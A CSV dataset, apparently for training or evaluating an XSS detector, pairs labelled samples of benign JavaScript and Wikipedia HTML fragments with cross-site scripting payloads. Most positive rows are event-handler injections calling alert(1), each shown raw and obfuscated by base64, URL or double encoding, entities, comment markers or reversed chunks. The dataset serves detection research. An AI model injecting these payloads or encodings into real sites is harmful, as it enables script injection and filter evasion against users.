sample_id,label,payload_original,payload_obfuscated,generator,recipe
1091,1,<kbd onpointerdown=alert(1)>xss</kbd>,PGtiZCBvbnBvaW50ZXJkb3duPWFsZXJ0KDEpPnhzczwva2JkPg==,llm_style_t1.0,base64
1092,0,"</p><p>simple exhaustive searches<sup id=""cite_ref-uninformed_search_188-0"" class=""reference""><a href=""#cite_note-uninformed_search-188"">&#91;184&#93; </a> </sup> are rarely sufficient for most real-world problems: the <a href=""/wiki/search_algorithm"" title=""search algorithm"">search space </a> (the number of places to search) quickly grows to <a href=""/wiki/astronomically_large"" class=""mw-redirect"" title=""astronomically large"">astronomical numbers </a>. the result is a search that is <a href=""/wiki/computation_time"" class=""mw-redirect"" title=""computation time"">too slow </a> or never completes. the solution, for many problems, is to use ""<a href=""/wiki/heuristics"" class=""mw-redirect"" title=""heuristics"">heuristics </a>"" or ""rules of thumb"" that prioritize choices in favor of those that are more likely to reach a goal and to do so in a shorter number of steps. in some search methodologies heuristics can also serve to entirely eliminate some choices that are unlikely to lead to a goal (called ""<a href=""/wiki/pruning_(algorithm)"" class=""mw-redirect"" title=""pruning (algorithm)"">pruning </a> the <a href=""/wiki/search_tree"" title=""search tree"">search tree </a>""). <a href=""/wiki/heuristics"" class=""mw-redirect"" title=""heuristics"">heuristics </a> supply the program with a ""best guess"" for the path on which the solution lies.<sup id=""cite_ref-informed_search_189-0"" class=""reference""><a href=""#cite_note-informed_search-189"">&#91;185&#93; </a> </sup> heuristics limit the search for solutions into a smaller sample size.<sup id=""cite_ref-footnotetecuci2012_130-1"" class=""reference""><a href=""#cite_note-footnotetecuci2012-130"">&#91;127&#93; </a> </sup>","</p><p>simple exhaustive searches<sup id=""cite_ref-uninformed_search_188-0"" class=""reference""><a href=""#cite_note-uninformed_search-188"">&#91;184&#93; </a> </sup> are rarely sufficient for most real-world problems: the <a href=""/wiki/search_algorithm"" title=""search algorithm"">search space </a> (the number of places to search) quickly grows to <a href=""/wiki/astronomically_large"" class=""mw-redirect"" title=""astronomically large"">astronomical numbers </a>. the result is a search that is <a href=""/wiki/computation_time"" class=""mw-redirect"" title=""computation time"">too slow </a> or never completes. the solution, for many problems, is to use ""<a href=""/wiki/heuristics"" class=""mw-redirect"" title=""heuristics"">heuristics </a>"" or ""rules of thumb"" that prioritize choices in favor of those that are more likely to reach a goal and to do so in a shorter number of steps. in some search methodologies heuristics can also serve to entirely eliminate some choices that are unlikely to lead to a goal (called ""<a href=""/wiki/pruning_(algorithm)"" class=""mw-redirect"" title=""pruning (algorithm)"">pruning </a> the <a href=""/wiki/search_tree"" title=""search tree"">search tree </a>""). <a href=""/wiki/heuristics"" class=""mw-redirect"" title=""heuristics"">heuristics </a> supply the program with a ""best guess"" for the path on which the solution lies.<sup id=""cite_ref-informed_search_189-0"" class=""reference""><a href=""#cite_note-informed_search-189"">&#91;185&#93; </a> </sup> heuristics limit the search for solutions into a smaller sample size.<sup id=""cite_ref-footnotetecuci2012_130-1"" class=""reference""><a href=""#cite_note-footnotetecuci2012-130"">&#91;127&#93; </a> </sup>",llm_style_t1.0,none
1093,0,"eventhandler.off(this._element, event_key)","eventhandler.off(this._element, event_key)",llm_style_t1.0,none
1094,0,"}) const openbootstrapsnippet = (htmlsnippet, jssnippet, classes) => { const indexhtml = `<!doctype html>","}) const openbootstrapsnippet = (htmlsnippet, jssnippet, classes) => { const indexhtml = `<!doctype html>",llm_style_t1.0,none
1095,1,"<th onmouseover=""alert(1)"">test</th>",PHRoIG9ubW91c2VvdmVyPSJhbGVydCgxKSI%2BdGVzdDwvdGg%2B,llm_style_t1.0,base64+html_then_urlencode
1096,1,"<style>:target {transform: rotate(180deg);}</style><plaintext id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></plaintext>",%26lt%3Bstyle%26gt%3B%3Atarget%20%7Btransform%3A%20rotate%28180deg%29%3B%7D%26lt%3B%2Fstyle%26gt%3B%26lt%3Bplaintext%20id%3Dx%20style%3D%26quot%3Btransition%3Atransform%202s%26quot%3B%20ontransitionrun%3Dalert%281%29%26gt%3B%26lt%3B%2Fplaintext%26gt%3B,llm_style_t1.0,html_then_urlencode
1097,0,let ancestor = this.placeholder[0].parentnode; while (ancestor !== null && !$(ancestor).is(document)) { let curr = $(ancestor);,let ancestor = this.placeholder[0].parentnode; while (ancestor !== null && !$(ancestor).is(document)) { let curr = $(ancestor);,llm_style_t1.0,none
1098,1,<track id=x tabindex=1 onactivate=alert(1)></track>,%253C%2520track%2520id%253D%2520x%2520tabindex%253D1%2520onactivate%253Dalert%25281%2529%253E%253C%252Ftrack%253E,llm_style_t1.0,whitespace_noise+double_urlencode
1099,0,} _removethumb() { $(this.thumb).remove();,} _removethumb() { $(this.thumb).remove();,llm_style_t1.0,none
1100,0,value: function _handlemouseleave() {,value: function _handlemouseleave() {,llm_style_t1.0,none
1101,0,config.target = getelement(config.target) || document.body; config.rootmargin = config.offset ? `${config.offset}px 0px -30%` : config.rootmargin; if (typeof config.threshold === 'string') {,config.target = getelement(config.target) || document.body; config.rootmargin = config.offset ? `${config.offset}px 0px -30%` : config.rootmargin; if (typeof config.threshold === 'string') {,llm_style_t1.0,none
1102,0,"_classcallcheck(this, charactercounter); var _this61 = _possibleconstructorreturn(this, (charactercounter.__proto__ || object.getprototypeof(charactercounter)).call(this, charactercounter, el, options)); _this61.el.m_charactercounter = _this61;","_classcallcheck(this, charactercounter); var _this61 = _possibleconstructorreturn(this, (charactercounter.__proto__ || object.getprototypeof(charactercounter)).call(this, charactercounter, el, options)); _this61.el.m_charactercounter = _this61;",llm_style_t1.0,none
1103,0,!!this.dropdownel.children[newfocusedindex] && this.dropdownel.children[newfocusedindex].tabindex !== -1 ) {,!!this.dropdownel.children[newfocusedindex] && this.dropdownel.children[newfocusedindex].tabindex !== -1 ) {,llm_style_t1.0,none
1104,0,"empty: function () { this.html(""""); return this;","empty: function () { this.html(""""); return this;",llm_style_t1.0,none
1105,0,"<div class=""section"" id=""built-in-services"">","<div class=""section"" id=""built-in-services"">",llm_style_t1.0,none
1106,1,"<bgsound onkeyup=""alert(1)"" contenteditable>test</bgsound>",%253Cbgsound%2520onkeyup%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fbgsound%253E,llm_style_t1.0,double_urlencode
1107,0,"_inherits(tabs, _component6)","_inherits(tabs, _component6)",llm_style_t1.0,none
1108,0,"<li><a href=""/wiki/digital_marketing"" title=""digital marketing"">digital marketing </a> </li>","<li><a href=""/wiki/digital_marketing"" title=""digital marketing"">digital marketing </a> </li>",llm_style_t1.0,none
1109,1,"<rp onkeydown=""alert(1)"" contenteditable>test</rp>",%3Crp%20onkeydown%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Frp%3E,llm_style_t1.0,urlencode
1110,0,"<ul><li><a href=""#citerefacm1998"">acm 1998 </a>, i.2.9, </li>","<ul><li><a href=""#citerefacm1998"">acm 1998 </a>, i.2.9, </li>",llm_style_t1.0,none
1111,0,"function documentleave ( event, data ) {","function documentleave ( event, data ) {",llm_style_t1.0,none
1112,0,_this22._setupactivetablink(),_this22._setupactivetablink(),llm_style_t1.0,none
1113,0,"</span>. <i>georgetown.edu </i>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=unknown&amp;rft.jtitle=georgetown.edu&amp;rft.atitle=artificial+intelligence%3a+an+introduction%2c+p.+37&amp;rft.aulast=maloof&amp;rft.aufirst=mark&amp;rft_id=http%3a%2f%2fpeople.cs.georgetown.edu%2f~maloof%2fcosc270.f17%2fcosc270-intro-handout.pdf&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">","</span>. <i>georgetown.edu </i>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=unknown&amp;rft.jtitle=georgetown.edu&amp;rft.atitle=artificial+intelligence%3a+an+introduction%2c+p.+37&amp;rft.aulast=maloof&amp;rft.aufirst=mark&amp;rft_id=http%3a%2f%2fpeople.cs.georgetown.edu%2f~maloof%2fcosc270.f17%2fcosc270-intro-handout.pdf&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",llm_style_t1.0,none
1114,0,"addclass(scope_target, options.cssclasses.drag)","addclass(scope_target, options.cssclasses.drag)",llm_style_t1.0,none
1115,1,<code onfocusout=alert(1) tabindex=1 id=x></code><input autofocus>,%26lt%3Bcode%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%26gt%3B%26lt%3B%2Fcode%26gt%3B%26lt%3Binput%20autofocus%26gt%3B,llm_style_t1.0,html_then_urlencode
1116,0,return storedtheme } return window.matchmedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',return storedtheme } return window.matchmedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',llm_style_t1.0,none
1117,1,"<option draggable=""true"" ondragend=""alert(1)"">test</option>","<option draggable=  "" true"" ondragend=""alert(1)"">test</option>",llm_style_t1.0,whitespace_noise
1118,1,"<dfn onmouseenter=""alert(1)"">test</dfn>",%3Cdfn%20onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fdfn%3E,llm_style_t1.0,urlencode
1119,0,"super(element, config) this._isenabled = true this._timeout = 0","super(element, config) this._isenabled = true this._timeout = 0",llm_style_t1.0,none
1120,0,this._updateampmview(),this._updateampmview(),llm_style_t1.0,none
1121,1,"<dt onmouseenter=""alert(1)"">test</dt>",&lt;dt onmouseenter=&quot;alert(  1)&quot;&gt;test&lt;/dt&gt;,llm_style_t1.0,html_entities+whitespace_noise
1122,1,"<bgsound onmousedown=""alert(1)"">test</bgsound>",%253Cbgsound%2520onmousedown%253D%2522alert%25281%2529%2522%253Etest%253C%252Fbgsound%253E,llm_style_t1.0,double_urlencode
1123,0,} } return scrollbarhelper;,} } return scrollbarhelper;,llm_style_t1.0,none
1124,0,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/developer-tools.html"">using your browser’s developer tools for scraping</a></li>","<li class=""toctree-l1""><a class=""reference internal"" href=""topics/developer-tools.html"">using your browser’s developer tools for scraping</a></li>",llm_style_t1.0,none
1125,1,https://portswigger-labs.net/xss/xss.php?x=%3cscript%3eundef01.undef02(%22injection%22%2balert(1));function%20undef01(){}//%22);%3c/script%3e,https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%253cscript%253eundef01.undef02%28%2522injection%2522%252balert%281%29%20%29%3B%20function%2520undef01%28%29%7B%7D%2F%20%20%2F%20%20%2522%29%3B%253c%2Fscript%253e,llm_style_t1.0,whitespace_noise+html_then_urlencode
1126,1,"<rb onbeforecut=""alert(1)"" contenteditable>test</rb>",%26lt%3Brb%20onbeforecut%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Frb%26gt%3B,llm_style_t1.0,html_then_urlencode
1127,0,"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 10.1–2, 22 </li> </ul>","<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 10.1–2, 22 </li> </ul>",llm_style_t1.0,none
1128,0,toast.el.classlist.add('panning'),toast.el.classlist.add('panning'),llm_style_t1.0,none
1129,1,"<div draggable=""true"" contenteditable>drag me</div><kbd ondrop=alert(1) contenteditable>drop here</kbd>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Ckbd%20ondrop%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Fkbd%3E,llm_style_t1.0,urlencode
1130,0,"set(element, key, instance) { if (!elementmap.has(element)) { elementmap.set(element, new map());","set(element, key, instance) { if (!elementmap.has(element)) { elementmap.set(element, new map());",llm_style_t1.0,none
1131,0,}; var effectcleanupfns = []; var isdestroyed = false;,}; var effectcleanupfns = []; var isdestroyed = false;,llm_style_t1.0,none
1132,1,"<sub oncontextmenu=""alert(1)"">test</sub>",3E2Fsub%st%3C%2%3Ete1%29%2ert%28D%22almenu%3ontext%20onc%3Csub,llm_style_t1.0,urlencode+reverse_chunks
1133,1,"<p onmouseout=""alert(1)"">test</p>",%253Cp%2520onmouseout%253D%2522alert%25281%2529%2522%253Etest%253C%252Fp%253E,llm_style_t1.0,double_urlencode
1134,0,"this._activate(innerelem, active); } _activate(element, relatedelem) {","this._activate(innerelem, active); } _activate(element, relatedelem) {",llm_style_t1.0,none
1135,0,value: function _enablebodyscrolling() { var body = document.body; body.style.overflow = '';,value: function _enablebodyscrolling() { var body = document.body; body.style.overflow = '';,llm_style_t1.0,none
1136,1,"<style>:target {color:red;}</style><marquee id=x style=""transition:color 1s"" ontransitionend=alert(1)></marquee>","<style>:target {color:red;}</style><marq/*OBF*/uee id=x style=""transition:color 1s/*OBF*/"" ontransitionend=alert(1)></marquee/*OBF*/>",llm_style_t1.0,comment_marker
1137,1,"<base onbeforecopy=""alert(1)"" contenteditable>test</base>",&lt;base onbeforecopy=&quot;alert(1)&quot; contenteditable&gt;test&lt; /base&gt;,llm_style_t1.0,whitespace_noise+html_entities
1138,0,"} }, this._config.delay.show); }","} }, this._config.delay.show); }",llm_style_t1.0,none
1139,0,"}, getmultipleelementsfromselector(element) { const selector = getselector(element);","}, getmultipleelementsfromselector(element) { const selector = getselector(element);",llm_style_t1.0,none
1140,1,"<dfn oncontextmenu=""alert(1)"">test</dfn>",%253Cdfn%2520oncontextmenu%253D%2522aler%252F%252AOBF%252A%252Ft%25281%2529%2522%253Etest%253C%252Fdfn%253E,llm_style_t1.0,comment_marker+double_urlencode
1141,0,"'sass/components/_carousel.scss',","'sass/components/_carousel.scss',",llm_style_t1.0,none
1142,0,"<li id=""cite_note-51""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-51"">^ </a> </b>","<li id=""cite_note-51""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-51"">^ </a> </b>",llm_style_t1.0,none
1143,0,this.$el.after(this.dropdownoptions),this.$el.after(this.dropdownoptions),llm_style_t1.0,none
1144,0,this._element.removeattribute('title'),this._element.removeattribute('title'),llm_style_t1.0,none
1145,0,"<li><a href=""#citereflugerstubblefield2004"">luger &amp; stubblefield 2004 </a>, pp.&#160;127–133 </li> </ul>","<li><a href=""#citereflugerstubblefield2004"">luger &amp; stubblefield 2004 </a>, pp.&#160;127–133 </li> </ul>",llm_style_t1.0,none
1146,1,<em onpointerenter=alert(1)>xss</em>,%253Cem%2520onpointerenter%253Dalert%25281%2529%253Exss%253C%252Fem%253E,llm_style_t1.0,double_urlencode
1147,1,"<plaintext onbeforepaste=""alert(1)"" contenteditable>test</plaintext>",t%3Eaintexst%3C%2Fplble%3Eteteditacontent%281%29%22%20%3D%22alerepastenbefortext%20o%3Cplain,llm_style_t1.0,reverse_chunks+urlencode+whitespace_noise
1148,0,"_inherits(parallax, _component5); function parallax(el, options) { _classcallcheck(this, parallax);","_inherits(parallax, _component5); function parallax(el, options) { _classcallcheck(this, parallax);",llm_style_t1.0,none
1149,0,"values = grid.values || false,","values = grid.values || false,",llm_style_t1.0,none
1150,1,<isindex onpointermove=alert(1)>xss</isindex>,%25253Cisindex%252520onpointermove%25253Dalert%2525281%252529%25253Exss%25253C%25252Fisindex%25253E,llm_style_t1.0,double_urlencode+html_then_urlencode
1151,0,"} // eslint-disable-next-line import/no-unused-modules const eventlisteners = { name: 'eventlisteners',","} // eslint-disable-next-line import/no-unused-modules const eventlisteners = { name: 'eventlisteners',",llm_style_t1.0,none
1152,1,<marquee id=x tabindex=1 onactivate=alert(1)></marquee>,%3Cmarquee%20id%3Dx%20tabindex%3D1%20onactivate%3Dalert%281%29%3E%3C%2Fmarquee%3E,llm_style_t1.0,urlencode+whitespace_noise
1153,0,that.xsteps.push( isnan(value[1]) ? false : value[1] ); } that.xhighestcompletestep.push(0);,that.xsteps.push( isnan(value[1]) ? false : value[1] ); } that.xhighestcompletestep.push(0);,llm_style_t1.0,none
1154,0,"return [].concat(...element.prototype.queryselectorall.call(element, selector)) }, findone(selector, element = document.documentelement) {","return [].concat(...element.prototype.queryselectorall.call(element, selector)) }, findone(selector, element = document.documentelement) {",llm_style_t1.0,none
1155,0,"this.el.removeeventlistener('touchend', this._handlecarouselreleasebound); } this.el.removeeventlistener('mousedown', this._handlecarouseltapbound);","this.el.removeeventlistener('touchend', this._handlecarouselreleasebound); } this.el.removeeventlistener('mousedown', this._handlecarouseltapbound);",llm_style_t1.0,none
1156,1,"<mark onmouseenter=""alert(1)"">test</mark>","<mark onmouseenter=""alert(1)"">test</mark>",llm_style_t1.0,comment_marker
1157,1,<textarea onpointerdown=alert(1)>xss</textarea>,ZWE+eHRhcjwvdGU+eHNzdCgxKWFsZXJvd249dGVyZHBvaW5hIG9udGFyZTx0ZXg=,llm_style_t1.0,reverse_chunks+base64+whitespace_noise
1158,0,"} if (this._issliding) { eventhandler.one(this._element, event_slid, () => this.cycle())","} if (this._issliding) { eventhandler.one(this._element, event_slid, () => this.cycle())",llm_style_t1.0,none
1159,0,element.document) || window.document).documentelement; } function getparentnode(element) {,element.document) || window.document).documentelement; } function getparentnode(element) {,llm_style_t1.0,none
1160,1,"<element oncut=""alert(1)"" contenteditable>test</element>",PGVsZW1lbnQgb25jdXQ9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzd/*OBF*/DwvZWxlbWVudD4=,llm_style_t1.0,base64+comment_marker
1161,0,"return _get(taptarget.__proto__ || object.getprototypeof(taptarget), ""init"", this).call(this, this, els, options); } }, {","return _get(taptarget.__proto__ || object.getprototypeof(taptarget), ""init"", this).call(this, this, els, options); } }, {",llm_style_t1.0,none
1162,0,"} hydrateobj(event, { delegatetarget: target }) if (handler.oneoff) {","} hydrateobj(event, { delegatetarget: target }) if (handler.oneoff) {",llm_style_t1.0,none
1163,1,"<ins onkeypress=""alert(1)"" contenteditable>test</ins>",%26lt%3Bins%20onkeypress%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fins%26gt%3B,llm_style_t1.0,html_then_urlencode
1164,1,<samp onpointerout=alert(1)>xss</samp>,%3Csamp%20onpointerout%3Dalert%281%29%3Exss%3C%2Fsamp%3E,llm_style_t1.0,urlencode
1165,1,<textarea onblur=alert(1) id=x></textarea><input autofocus>,<  textarea onblur=alert(1) id=x></textarea><input autofocus>  ,llm_style_t1.0,whitespace_noise
1166,0,} class templatefactory extends config { constructor(config) {,} class templatefactory extends config { constructor(config) {,llm_style_t1.0,none
1167,0,return _this56.options.i18n.months[_this56.date.getmonth()],return _this56.options.i18n.months[_this56.date.getmonth()],llm_style_t1.0,none
1168,0,"} function normalizeparameters(originaltypeevent, handler, delegationfunction) { const isdelegated = typeof handler === 'string';","} function normalizeparameters(originaltypeevent, handler, delegationfunction) { const isdelegated = typeof handler === 'string';",llm_style_t1.0,none
1169,0,currchips.$input[0].focus(),currchips.$input[0].focus(),llm_style_t1.0,none
1170,0,if (el.tagname.tolowercase() === 'input') { var parent = el.parentnode; if (parent.tagname.tolowercase() === 'i' && parent.classname.indexof('waves-effect') !== -1) {,if (el.tagname.tolowercase() === 'input') { var parent = el.parentnode; if (parent.tagname.tolowercase() === 'i' && parent.classname.indexof('waves-effect') !== -1) {,llm_style_t1.0,none
1171,1,"<bdo onkeyup=""alert(1)"" contenteditable>test</bdo>","<  bdo onkeyup=""alert(1)"" contenteditable>test</bdo>",llm_style_t1.0,whitespace_noise
1172,1,"<progress onmouseover=""alert(1)"">test</progress>",PHByb2dyZXNzIG9ubW91c2VvdmVyPSJhbGVydCgxKSI+dGVzdDwvcHJvZ3Jlc3M+,llm_style_t1.0,base64
1173,1,"<style>@keyframes slidein {}</style><title style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></title>","<style>@keyframes slidein {}</style><title style=""animation-duration: 1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(  1)""></title> ",llm_style_t1.0,whitespace_noise
1174,1,"<picture draggable=""true"" ondrag=""alert(1)"">test</picture>",%26lt%3Bpicture%20draggable%3D%26quot%3Btrue%26quot%3B%20ondrag%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fpicture%26gt%3B,llm_style_t1.0,html_then_urlencode
1175,0,"basesize: basesize(), pageoffset: event.pageoffset, handlenumbers: data.handlenumbers,","basesize: basesize(), pageoffset: event.pageoffset, handlenumbers: data.handlenumbers,",llm_style_t1.0,none
1176,0,var clippingparents = listscrollparents(getparentnode(element)),var clippingparents = listscrollparents(getparentnode(element)),llm_style_t1.0,none
1177,1,"<ol draggable=""true"" ondragenter=""alert(1)"">test</ol>",%252526lt%25253Bol%252520draggable%25253D%252526quot%25253Btrue%252526quot%25253B%252520ondragenter%25253D%252526quot%25253Balert%2525281%252529%252526quot%25253B%252526gt%25253Btest%252526lt%25253B%25252Fol%252526gt%25253B,llm_style_t1.0,html_then_urlencode+double_urlencode
1178,1,"<progress ondblclick=""alert(1)"">test</progress>","<progress ondblclick=""alert(1)"">test</progre/*OBF*/ss>",llm_style_t1.0,comment_marker
1179,1,"<rp onmousemove=""alert(1)"">test</rp>","<rp onmousemove=""a/*OBF*/lert(1)"">test</rp>",llm_style_t1.0,comment_marker
1180,0,return [previous] } previous = previous.previouselementsibling,return [previous] } previous = previous.previouselementsibling,llm_style_t1.0,none
1181,0,"return ''; } var formatarray = format.split(/(d{1,4}|m{1,4}|y{4}|yy|!.)/g);","return ''; } var formatarray = format.split(/(d{1,4}|m{1,4}|y{4}|yy|!.)/g);",llm_style_t1.0,none
1182,1,"<noembed onkeypress=""alert(1)"" contenteditable>test</noembed>",">oembedest</nable>tntedit contert(1)""s=""aleeypresed onk<noemb",llm_style_t1.0,reverse_chunks
1183,1,"<xmp onmouseup=""alert(1)"">test</xmp>",bXA+PC94ZXN0Ij50KDEpZXJ0ImFsdXA9dXNlbm1vcCBvPHht,llm_style_t1.0,reverse_chunks+base64
1184,0,"}) : this; }, removeprop: function (name) {","}) : this; }, removeprop: function (name) {",llm_style_t1.0,none
1185,0,if (!this.options.draggable || this._iscurrentlyfixed() || this._verticallyscrolling) { return; },if (!this.options.draggable || this._iscurrentlyfixed() || this._verticallyscrolling) { return; },llm_style_t1.0,none
1186,0,"eventhandler.trigger(this._element, event_activate, { relatedtarget: target })","eventhandler.trigger(this._element, event_activate, { relatedtarget: target })",llm_style_t1.0,none
1187,0,_configaftermerge(config) { return config },_configaftermerge(config) { return config },llm_style_t1.0,none
1188,0,} } var currentnode = getparentnode(element);,} } var currentnode = getparentnode(element);,llm_style_t1.0,none
1189,0,"'use strict'; let _defaults = { edge: 'left',","'use strict'; let _defaults = { edge: 'left',",llm_style_t1.0,none
1190,1,"<style>@keyframes x{}</style><dd style=""animation-name:x"" onanimationstart=""alert(1)""></dd>",PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48ZGQgc3R5bGU9ImFuaW1hdGlvbi1uYW1lOngiIG9uYW5pbWF0aW9uc3RhcnQ9ImFsZXJ0KDEpIj48L2RkPg==,llm_style_t1.0,base64+html_entities
1191,1,"<h1 onmouseover=""alert(1)"">test</h1>","<h1 onmouseover=""al/*OBF*/er/*OBF*/t(1)"">test</h1>",llm_style_t1.0,comment_marker
1192,0,const target = selectorengine.getelementfromselector(this) || this.closest(`.${name}`),const target = selectorengine.getelementfromselector(this) || this.closest(`.${name}`),llm_style_t1.0,none
1193,0,var closestoverflowparent = !!this.dropdownel.offsetparent ? this.dropdownel.offsetparent : this.dropdownel.parentnode,var closestoverflowparent = !!this.dropdownel.offsetparent ? this.dropdownel.offsetparent : this.dropdownel.parentnode,llm_style_t1.0,none
1194,0,.each(function() { $(this).toggleclass('flow-text'); });,.each(function() { $(this).toggleclass('flow-text'); });,llm_style_t1.0,none
1195,0,"this.donebtn.addeventlistener('click', this._finishselectionbound)","this.donebtn.addeventlistener('click', this._finishselectionbound)",llm_style_t1.0,none
1196,1,"<command oncopy=""alert(1)"" contenteditable>test</command>",PCAgY29tbWFuZCBvbmNvcHk9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvY29tbWFuZD4=,llm_style_t1.0,whitespace_noise+base64+html_entities
1197,0,isfixed = $(parents[i]).css('position') == 'fixed'; if (isfixed) { break;,isfixed = $(parents[i]).css('position') == 'fixed'; if (isfixed) { break;,llm_style_t1.0,none
1198,0,_handlecontainermouseupandtouchend(e) {,_handlecontainermouseupandtouchend(e) {,llm_style_t1.0,none
1199,0,"}, { key: ""_animateoverlayout"", value: function _animateoverlayout() {","}, { key: ""_animateoverlayout"", value: function _animateoverlayout() {",llm_style_t1.0,none
1200,1,<svg><canvas onload=alert(1)></canvas>,%25253Csvg%25253E%25253Ccanvas%252520onload%25253Dalert%2525281%252529%25253E%25253C%25252Fcanvas%25253E,llm_style_t1.0,double_urlencode+urlencode
1201,1,"<nobr draggable=""true"" ondrag=""alert(1)"">test</nobr>",PG5vYnIgZHJhZ2dhYmxlPSJ0cnVlIiBvbmRyYWc9ImFsZXJ0KDEpIj50ZXN0PC9ub2JyPg==,llm_style_t1.0,base64
1202,1,"<* onkeyup=""alert(1)"" contenteditable style=display:block>test</*>",%253C%252A%2520onkeyup%253D%2522alert%25281%2529%2522%2520contenteditable%2520style%253Ddisplay%253Ablock%253Etest%253C%252F%252A%253E,llm_style_t1.0,double_urlencode
1203,0,var tab = $(e.target).closest('li.tab'),var tab = $(e.target).closest('li.tab'),llm_style_t1.0,none
1204,1,"<style>:target {transform: rotate(180deg);}</style><iframe id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></iframe>",%3Cstyle%3E%3Atarget%20%7Btransform%3A%20rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ciframe%20id%3Dx%20style%3D%22transition%3Atransform%202s%22%20ontransitionrun%3Dalert%281%29%3E%3C%2Fiframe%3E,llm_style_t1.0,urlencode
1205,0,"_classcallcheck(this, autocomplete); var _this37 = _possibleconstructorreturn(this, (autocomplete.__proto__ || object.getprototypeof(autocomplete)).call(this, autocomplete, el, options)); _this37.el.m_autocomplete = _this37;","_classcallcheck(this, autocomplete); var _this37 = _possibleconstructorreturn(this, (autocomplete.__proto__ || object.getprototypeof(autocomplete)).call(this, autocomplete, el, options)); _this37.el.m_autocomplete = _this37;",llm_style_t1.0,none
1206,0,"</span> </a> </i>&#93; </sup>. furthermore, ai in the markets limits the consequences of behavior in the markets again making markets more efficient<sup class=""noprint inline-template template-fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/wikipedia:citation_needed"" title=""wikipedia:citation needed""><span title=""this claim needs references to reliable sources. (july 2019)"">citation needed","</span> </a> </i>&#93; </sup>. furthermore, ai in the markets limits the consequences of behavior in the markets again making markets more efficient<sup class=""noprint inline-template template-fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/wikipedia:citation_needed"" title=""wikipedia:citation needed""><span title=""this claim needs references to reliable sources. (july 2019)"">citation needed",llm_style_t1.0,none
1207,0,"this.$el.removeattr('height'); } this.$overlay = $('<div id=""materialbox-overlay""></div>').css({","this.$el.removeattr('height'); } this.$overlay = $('<div id=""materialbox-overlay""></div>').css({",llm_style_t1.0,none
1208,0,} const tip = this._gettipelement(); tip.classlist.remove(class_name_show$2);,} const tip = this._gettipelement(); tip.classlist.remove(class_name_show$2);,llm_style_t1.0,none
1209,0,"key: ""_handlewindowresize"", value: function _handlewindowresize() { if (this.lastwindowwidth !== window.innerwidth) {","key: ""_handlewindowresize"", value: function _handlewindowresize() { if (this.lastwindowwidth !== window.innerwidth) {",llm_style_t1.0,none
